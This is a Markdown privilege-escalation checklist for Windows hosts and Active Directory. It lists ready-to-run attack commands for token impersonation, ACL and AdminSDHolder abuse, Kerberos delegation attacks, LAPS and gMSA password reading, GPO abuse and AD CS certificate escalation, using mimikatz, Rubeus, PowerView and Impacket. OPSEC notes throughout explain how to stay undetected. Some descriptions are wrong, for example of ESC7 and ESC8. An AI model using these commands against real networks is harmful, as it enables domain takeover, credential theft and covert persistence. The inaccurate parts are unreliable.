# Privilege Escalation Checklist

## Local Privilege Escalation (Windows)

- [ ] Check current user privileges: `whoami /priv` — Look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege
- [ ] Check token groups: `whoami /groups` — Look for BUILTIN\Administrators, Domain Admin SID
- [ ] Check UAC status: `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — If 0, admin token not filtered
- [ ] Check for hotpotato/juicypotato abuse: `whoami /priv | findstr "SeImpersonate"` — If present, run JuicyPotato/PrintSpoofer/RogueWinRM
- [ ] Check unquoted service paths: `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """` 
- [ ] Check weak service permissions: `Get-Service | % { Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.name)" }` — Look for non-admin MODIFY/SERVICE_CHANGE_CONFIG
- [ ] Check weak service binary permissions: `icacls <service-path>` — Look for Everyone/BUILTIN\Users with (F) or (M)
- [ ] Check AlwaysInstallElevated: `REG QUERY HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` — If 1, users can install MSI as SYSTEM
- [ ] Check registry auto-run: `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\*` — Weak permissions = DLL hijack
- [ ] Check modifiable scheduled tasks: `schtasks /query /fo LIST /v | findstr "Task To Run"` — Look for writable task binaries
- [ ] Check kernel exploits: Execute `windows-exploit-suggester.py` against systeminfo output
- [ ] Token impersonation: Use `Incognito.exe list_tokens -u` / `Incognito.exe execute -c "<token>" cmd.exe`
- [ ] Named pipe abuse: Look for privileged services with impersonation via named pipes
- [ ] **OPSEC**: Kernel exploits risk system crash; prefer software/config-based escalation
- [ ] **OPSEC**: Token manipulation is common and EDR may detect `SeImpersonatePrivilege` abuse

## AD ACL Abuse

- [ ] Find interesting ACLs: `Find-InterestingDomainAcl -ResolveGUIDs` — Broad ACL search
- [ ] Check for GenericAll on user: `Get-ObjectAcl -SamAccountName <target-user> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll" }` — Full control = reset password, add to group, etc.
- [ ] Check for GenericAll on group: `Get-ObjectAcl -SamAccountName <target-group> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll" }` — Add self to group
- [ ] Check for GenericWrite on user: `Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty|WriteDACL|GenericAll" -and $_.SecurityIdentifier -eq <current-user-sid> }` — Write = modify attributes (scriptpath, SPN, logonHour)
- [ ] Check for WriteDACL on group: Can write group membership — Add user to admin group
- [ ] Check for WriteOwner on object: Change owner to self, then modify
- [ ] Self-service password reset: Check if `Self-Membership` permission exists for a group
- [ ] ForceChangePassword abuse: `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)` — If user has ForceChangePassword right
- [ ] Add user to group via ACL: `Add-DomainGroupMember -Identity <group> -Members <user>` — If GenericWrite on group
- [ ] Modify user SPN for targeted Kerberoast: `Set-DomainObject -Identity <user> -Set @{serviceprincipalname='fake/http'}` then Kerberoast, crack, access as that user
- [ ] **OPSEC**: ACL abuse modifies AD objects; changes are replicated and logged (event ID 5136)
- [ ] **OPSEC**: Reset password events (4723/4724) are logged; consider targeted Kerberoast via SPN instead

## AdminSDHolder Abuse

- [ ] Check current AdminSDHolder ACL: `Get-ObjectAcl -ADSpath "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>" -ResolveGUIDs`
- [ ] Modify AdminSDHolder to grant user DCSync rights: `Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>" -PrincipalSamAccountName <user> -Rights DCSync`
- [ ] Wait for SDProp (60 min) or force: `Invoke-ADSDPropagation` — After 60 min, user becomes effectively DA
- [ ] **OPSEC**: AdminSDHolder changes are replicated to all protected objects; very high detection risk
- [ ] **OPSEC**: SDProp runs every hour; changes to AdminSDHolder are visible in AD replication

## Unconstrained Delegation Abuse

- [ ] Find computers with unconstrained delegation: `Get-NetComputer -Unconstrained` — List all with trusted for delegation
- [ ] Compromise unconstrained delegation host (e.g., via exploit, creds): Any user authenticating there has their TGT captured
- [ ] Force DA to authenticate: Printer bug (MS-RPRN) — `MS-RPRN.exe <dc> <unc-dcsystem>` triggers DA auth
- [ ] Capture TGTs: Once DA connects, their TGT is cached on the server; dump with `mimikatz sekurlsa::tickets /export`
- [ ] Inject DA TGT: `mimikatz kerberos::ptt <da-ticket.kirbi>` — Effective DA for that session
- [ ] **OPSEC**: Unconstrained delegation servers are high-value targets; compromise them quietly
- [ ] **OPSEC**: Printer bug (SpoolSample) is logged; use `SharpSpoolTrigger` for more control

## Constrained Delegation Abuse

- [ ] Find users with constrained delegation: `Get-NetUser -TrustedToAuth` — Users with AllowedToDelegateTo
- [ ] Find computers with constrained delegation: `Get-NetComputer -TrustedToAuth`
- [ ] Show delegation details: `Get-NetUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, serviceprincipalname`
- [ ] Abuse constrained delegation (user has SPN): Use `Impacket getST.py` to get a TGS for any user → the delegated service
- [ ] Abuse via Kekeo: `tgt::ask /user:<user> /password:<pass> /domain:<domain> ; tgs::s4u /tgt:<tgt> /user:<target-user>@<domain> /service:<service/spn>`
- [ ] Abuse via Rubeus: `Rubeus asktgt /user:<user> /password:<pass> /domain:<domain> /ptt` then `Rubeus s4u /ticket:<base64> /impersonateuser:<target> /msdsspn:"<service/spn>" /altservice:<alt-svc> /ptt`
- [ ] **OPSEC**: S4U2Proxy requests (TGS-REQ with cname=another-user) are logged in event 4769
- [ ] **OPSEC**: Constrained delegation is restricted to specific services; check `msds-allowedtodelegateto`

## Resource-Based Constrained Delegation (RBCD)

- [ ] Find RBCD-capable systems: Search for computers where you have `GenericWrite` / `GenericAll` — Write access to msDS-AllowedToActOnBehalfOfOtherIdentity
- [ ] If you can write to a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`, you're DA on that box
- [ ] Setup RBCD: `Rubeus.exe s4u /user:<controlled-user> /rc4:<hash> /impersonateuser:administrator /msdsspn:"cifs/<target-computer>" /ptt`
- [ ] Create RBCD with PowerView: `Set-DomainObject -Identity <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=<binary>}`
- [ ] Exploit with Impacket: `python3 rbcd.py <domain>/<user>:<pass> -dc-ip <dc> -target <target> -action write -delegation-computer <controlled-computer>`
- [ ] Then get ST: `getST.py -spn "cifs/<target>" <domain>/<controlled-computer>\$ -impersonate administrator -dc-ip <dc>`
- [ ] **OPSEC**: RBCD requires write access to target computer's attributes (GenericWrite/GenericAll)
- [ ] **OPSEC**: RBCD doesn't rely on SPN of delegating user; more flexible but still logged

## Group Membership Abuse

- [ ] Check current user domain groups: `whoami /groups | findstr "Domain"`
- [ ] Check nested group memberships: `Get-NetGroupMember "<group>" -Recurse`
- [ ] Check foreign group memberships (cross-domain): `Get-NetForeignGroupMember`
- [ ] Check if user is local admin on many machines: `crackmapexec smb <subnet> -u <user> -H <hash>`
- [ ] Check if user can add self to groups: `Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll" -and $_.ObjectType -eq "bf9679c0-0de6-11d0-a285-00aa003049e2" }` — WriteProperty on member attribute
- [ ] **OPSEC**: Adding yourself to a group triggers event 4728 (member added)

## LAPS Abuse

- [ ] Find who can read LAPS passwords: `Find-AdmPwdExtendedRightsCheck -OrgUnit <ou>`
- [ ] Read LAPS for DA access: Get local admin password for a Domain Controller via LAPS — then DCSync
- [ ] Read LAPS for all computers: `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd` — If delegated, read all
- [ ] **OPSEC**: LAPS reading is normal for helpdesk; blend with their patterns

## GPO Abuse

- [ ] Find GPOs with write access: `Get-ObjectAcl -ResolveGUIDs | ? { $_.ObjectType -eq "groupPolicyContainer" -and $_.ActiveDirectoryRights -match "CreateChild|GenericAll|Write" -and $_.SecurityIdentifier -eq <current-user-sid> }`
- [ ] Add user to local admin group via GPO: Modify GPO's restricted groups or startup script
- [ ] Scheduled task via GPO: Set logon script in GPO to execute as SYSTEM
- [ ] GPO immediate task: Add immediate task to GPO for high-priv code execution
- [ ] **OPSEC**: GPO modification is logged (event 5136 on GPO objects); startup scripts run at boot

## Group Managed Service Accounts (gMSA)

- [ ] Find gMSA accounts: `Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword`
- [ ] Read gMSA password: Use `gMSADumper.py` or `Get-ADServiceAccount -Identity <gMSA> -Properties msDS-ManagedPassword`
- [ ] **OPSEC**: gMSA access is controlled; only specified principals can retrieve the password

## Domain Local Groups

- [ ] Enumerate domain local groups: `Get-NetGroup -GroupScope DomainLocal`
- [ ] Check who is in `Administrators`: `Get-NetGroupMember "Administrators"` — Domain admins get added to local groups of DC
- [ ] Check `Remote Management Users`: `Get-NetGroupMember "Remote Management Users"`
- [ ] Check `Backup Operators`: `Get-NetGroupMember "Backup Operators"` — Can backup files including NTDS.dit
- [ ] Check `Server Operators`: `Get-NetGroupMember "Server Operators"` — Can logon to DC interactively
- [ ] Check `Print Operators`: `Get-NetGroupMember "Print Operators"` — Can load printer drivers = SYSTEM on DC
- [ ] **OPSEC**: These built-in groups are powerful; membership is logged

## Certificate Services (AD CS) Escalation

- [ ] Find ESC1 (Enrollee supplies subject + manager approval off + authorized signatures): If user can enroll in a template with EKU Client Auth + supply subject = instant Domain Admin
- [ ] Request certificate with alternative subject: `certreq -new -config <CA> request.inf cert.pem` — Modify subject to "Administrator"
- [ ] ESC2 (Any Purpose + enrollee supplies subject): Can use cert for any purpose, including authentication
- [ ] ESC3 (Enrollment Agent + no approval): Can enroll on behalf of another user
- [ ] ESC4 (Write access to template): If you can modify the security descriptor on a template, you can make it vulnerable to ESC1
- [ ] ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA): If `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set, SAN can be modified in request
- [ ] ESC7 (NTLM relay to CA enrollment): If HTTP enrollment enabled, relay to get cert
- [ ] ESC8 (NTLM relay to DC via CA): Relay NTLM from CA to get TGT or auth
- [ ] **OPSEC**: Certificate requests are logged (event 4886/4887); some templates may alert on non-standard subjects

## Exchange / Mailbox Abuse

- [ ] Check if current user is in `Exchange Windows Permissions` group — Grants WriteDACL to domain
- [ ] Exchange Windows Permissions + WriteDACL: Can DCSync via WriteDACL abuse
- [ ] Exchange Servers group: Member servers can abuse ACLs on admin groups
- [ ] **OPSEC**: Exchange is heavily monitored; its groups have powerful implicit AD rights

## OPSEC Summary

| Technique | Detection Risk | Notes |
|---|---|---|
| Local privesc (Potato) | High | Named pipe impersonation is EDR-flagged |
| Kernel exploit | Very High | System crash risk |
| ACL abuse (ForceChangePwd) | Medium | Password change events |
| ACL abuse (Add to Group) | Medium | Group change events |
| AdminSDHolder | Very High | SDProp propagation is visible |
| Unconstrained del. (Printer bug) | High | Printer bug and TGT capture |
| Constrained del. S4U | Medium | S4U2Proxy is logged |
| RBCD | Medium | Attribute modification logged |
| LAPS | Low | Normal admin behavior |
| GPO modification | High | GPO replication events |
| AD CS ESC1 | Medium | Certificate issuance events |
| Exchange groups | Low-High | Depends on environment monitoring |

## Priority Escalation Paths

1. **Low hanging fruit**: Check `whoami /priv`, always; check `Find-InterestingDomainAcl`
2. **If local admin on any box**: Gather all creds; run SharpHound; find delegation + ACL paths
3. **BloodHound analysis**: Upload to BH; examine shortest paths to DA from your current position
4. **Delegation abuse**: If unconstrained server exists, printer bug + capture TGT
5. **AD CS abuse**: If CA + vulnerable template exists → certificate to DA
6. **RBCD**: If you have GenericWrite on any computer → install RBCD → local admin on that box
7. **ACL abuse**: Many organizations have misconfigured ACLs; BloodHound will identify them
8. **AdminSDHolder**: Last resort; very noisy → use only if other paths fail
